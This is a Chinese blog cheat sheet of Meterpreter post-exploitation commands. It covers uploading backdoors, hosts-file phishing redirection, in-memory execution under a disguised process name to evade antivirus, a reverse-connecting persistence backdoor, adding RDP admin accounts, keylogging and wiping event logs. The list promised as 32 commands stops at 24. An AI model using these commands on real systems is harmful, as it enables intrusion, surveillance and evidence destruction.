@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>meterpreter会话渗透利用常用的32个命令归纳 | Echo&#39;s Blog | 在运维的道路上越走越远</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="kali,msf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备">
+<meta name="keywords" content="kali,msf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="meterpreter会话渗透利用常用的32个命令归纳">
+<meta property="og:url" content="http://www.deops.cn/posts/ea141142/index.html">
+<meta property="og:site_name" content="Echo&#39;s Blog">
+<meta property="og:description" content="仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8tyn8gkij30gb03t403.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fy8vg3iir3j30ee02rjse.jpg">
+<meta property="og:updated_time" content="2018-12-16T13:05:43.834Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="meterpreter会话渗透利用常用的32个命令归纳">
+<meta name="twitter:description" content="仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8tyn8gkij30gb03t403.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Echo&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.gif" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Echo</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/album"  >
+                    <i class="icon icon-lg icon-image"></i>
+                    <span>相 册</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="http://t.cn/RrDDg7q" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Marnm" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6040025614" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">meterpreter会话渗透利用常用的32个命令归纳</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+<article id="post-meterpreter会话渗透利用常用的32个命令归纳"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">meterpreter会话渗透利用常用的32个命令归纳</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-12-16 19:45:20" datetime="2018-12-16T11:45:20.000Z"  itemprop="datePublished">2018-12-16</time>
+
+            <br id="mybreak"/>
+            
+<script>
+	mybreak.style="display:none";
+</script>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">4</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备</strong><br><a id="more"></a></p>
+<p><strong>1、background命令</strong><br>返回，把meterpreter后台挂起<br><strong>2、session命令</strong><br>session命令可以查看已经成功获取的会话<br>可以使用session -i连接到指定序号的meterpreter会话以继续利用<br><strong>3、shell命令</strong><br>获取目标主机的远程命令shell<br>如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fy8tyn8gkij30gb03t403.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure><br><strong>4、cat命令</strong><br>查看目标主机上的文档内容<br>例如：cat C:\boot.ini查看目标主机的启动引导信息<br><strong>5、getwd命令</strong><br>获取系统工作的当前目录<br><strong>6、upload命令</strong><br>上传文件到目标主机，例如把后门程序setup.exe传到<code>system32</code>目录下<br><code>meterpreter&gt; upload setup.exe C:\\windows\\system32\</code><br><strong>7、download命令</strong><br>把目标主机上的文件下载到我们的攻击机上<br><code>download C:\boot.ini /root/</code><br><strong>8、edit命令</strong><br>调用vi编辑器，对目标主机上的文件修改<br>例如修改目标主机上的<code>host</code>文件，使目标主机访问baidu时去到准备好的钓鱼网站<br><strong>9、search命令</strong><br>在目标主机文件系统上查找搜索文件<br>例如：search -d c:\ -f *.doc<br><strong>10、ipconfig</strong><br>我略。。。<br><strong>11、portfwd命令</strong><br>端口转发<br>例如目标主机上开启了3390，但是只允许特定ip访问，攻击机无法连接，可以使用portfwd命令把目标主机的3389端口转发到其他端口打开</p>
+<blockquote>
+<p>例如：portfwd add -l 1122 -p 3389 -r 192.168.1.2</p>
+</blockquote>
+<p>把目标主机192.168.1.2的3389端口转发到1122端口<br>这时只需要连接目标的1122端口就可以打开远程桌面了<br>rdesktop -u administrator -p Abc123456 192.168.1.2:1122<br><strong>12、route命令</strong><br>略。。。<br><strong>13、getuid</strong><br>查看meterpreter注入到目标主机的进程所属用户<br><strong>14、sysinfo</strong><br>查看目标主机系统信息<br><strong>15、ps命令</strong><br>查看目标主机上运行的进程信息<br><strong>16、migrate</strong><br>将meterpreter会话移植到另一个进程<br>例如反弹的meterpreter会话是对方打开了一个你预置特殊代码的Word文档而产生的，那么对方一旦关闭掉该Word文档，我们获取到meterpreter会话也随之关闭，所以把会话注入到explorer.exe是一个好方法<br>可以先用ps命令看一下目标主机的explorer.exe进程的pid</p>
+<blockquote>
+<p>例如<br>migrate 1668<br>把meterpreter会话注入进去pid为1688进程的explorer.exe</p>
+</blockquote>
+<p><strong>17、execute命令</strong><br>在目标主机上运行某个程序<br>例如我们运行一下目标主机上的记事本程序<br><code>execute -f notepad.exe</code><br>目标主机立马弹出一个记事本程序<br>这样太明显，如果希望隐藏后台执行，加参数-H<br><code>execute -H -f notepad.exe</code><br>此时目标主机桌面没反应，但我们在meterpreter会话上使用ps命令看到了<br>再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上<br>命令：<br><code>execute -H -i -f cmd.exe</code><br>这达到的效果就跟使用shell命令一样了</p>
+<p>再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。<br><code>execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;</code><br>-d 在目标主机执行时显示的进程名称（用以伪装）<br>-m 直接从内存中执行<br>“-o  wce.txt”是wce.exe的运行参数</p>
+<p><strong>18、getpid</strong><br>获取meterpreter会话在目标主机上注入进程的进程号</p>
+<p><strong>19、调用post/windows/gather/checkvm后渗透模块，确定目标主机是否是一台虚拟机</strong></p>
+<blockquote>
+<p>run post/windows/gather/checkvm</p>
+</blockquote>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fy8vg3iir3j30ee02rjse.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p><strong>20、persistence后渗透模块向目标主机植入后门程序</strong></p>
+<blockquote>
+<p>run persistencce -X -i 5 -p 4444 -r 192.169.23.124<br>-X 在目标主机上开机自启动<br>-i  不断尝试反向连接的时间间隔</p>
+</blockquote>
+<p><strong>21、调用getgui后渗透攻击模块</strong><br>作用：开启目标主机远程桌面，并可添加管理员组账号<br>命令：<br><code>run getgui -e</code><br>开启目标主机的远程桌面服务后，可以添加账号以便利用<br>命令：<br><code>run getgui -u kali -p 123456</code><br>执行成功，可以使用kali的rdesktop命令使用远程桌面连接目标主机<br><code>rdesktop -u kali -p meterpreter 192.168.250.176:3389</code></p>
+<p><strong>22、提权命令getsysem</strong></p>
+<p><strong>23、键盘记录器功能keyscan</strong><br>keyscan_start    开启记录目标主机的键盘输入<br>keyscan_dump    输出截获的目标键盘输入字符信息<br>keyscan_stop    停止键盘记录</p>
+<p><strong>24、clearev命令</strong><br>入侵痕迹擦除<br>在渗透利用过程中难免留下日志等信息痕迹，使用clearev命令擦除后再跑</p>
+<p>。。。。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新：<time datetime="2018-12-16T13:05:43.834Z" itemprop="dateUpdated">2018-12-16 21:05:43</time>
+</span>
+
+
+        
+    </div>
+    <footer>
+        <div onclick="location.href='http://www.deops.cn'">
+            <img src="/img/avatar.gif" alt="Echo">
+            <a>Echo</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/">msf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/ea141142/&title=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/ea141142/&title=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&source=仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/ea141142/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&url=http://www.deops.cn/posts/ea141142/&via=http://www.deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/ea141142/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/4a2cdcee/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：nmap使用指南">下一篇：nmap使用指南</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heartbeat"></i>
+            <a href="http://www.deops.cn">Echo</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <!--<span class="license"><a  target="_blank" rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">博客内容遵循 知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>-->
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.deops.cn/posts/ea141142/&title=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&pic=http://www.deops.cn/img/avatar.gif" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.deops.cn/posts/ea141142/&title=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&source=仅作渗透测试技术试验之用，请勿针对任何未授权网络和设备" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/ea141142/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《meterpreter会话渗透利用常用的32个命令归纳》 — Echo's Blog&url=http://www.deops.cn/posts/ea141142/&via=http://www.deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/ea141142/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABzUlEQVR42u3aQW7DMAwFUd//0u62QBtpPmlJMTBaBW4iP3ZBiKSuC6/71/r0nHzn7/NrxZIrV26bew9XjUWIZP9/QpIrV+5G7qeMQbbm3yf7T2xy5cr9Yi4/e5AA5MqV+3Yu2nSY8rYmMrly5Ta4PA1xbr+4kitX7iku71Ku+7ykvytXrtwS9w4XOb7wsid+u1y5crdweUJJj0FpGMFwV65cuYu5T23Kk1Rtn+vZ/4FcuXLnfUvU5uBN1XGofFgboOXKlbuA22lipkXO5LRFwpYrV+4WLh+KpFcuOqXUOCS5cuWu4xb7KGAoMqbzkW2rfyNXrtwSl6ekcZHDX8yPU5N3yZUrdxmXjE55QyRNaungVq5cuae4vG2alj3pJYy4+JErV+5DXJ5QavRaKpyUSXLlyj3KTS9GkOcPtFfkypW7nZuOPHkAnWJJrly5Z7mdtgU50KRt1uDPcuXKfYh7hysNtZME5cqVe4rbv4DVSUy8LRIHI1eu3DaXjzR46dIpjYr3ROTKlbuAmyaaSfOiVoeRX8mVK/cl3FoRlTZS5cqV+y4uf1JLagvzrly5codcnnRqbZH0+sVkyCpXrtzF3DiVtMuYWqhy5crdwv0B76aaeUxlCWoAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/06/29");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Echo");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+<script src="/live2d-widget/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2d-widget/assets/hijiki.model.json"},"display":{"position":"left","width":50,"height":100,"hOffset":50},"mobile":{"show":false},"log":false});</script></body>
+</html>
